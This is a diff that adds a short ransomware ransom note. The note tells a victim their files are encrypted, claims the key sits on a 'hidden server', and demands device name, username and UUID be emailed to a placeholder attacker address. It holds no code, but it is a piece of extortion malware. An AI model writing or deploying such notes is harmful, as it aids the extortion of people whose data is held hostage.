@@ -1,0 +1,7 @@
+Your personal files are encrypted.
+The decryption key is sent to my hidden server. To decrypt your files, email your Device name, Username and UUID to [attacker_email_address].
+UUID is used to indentify your computer.
+
+
+
+
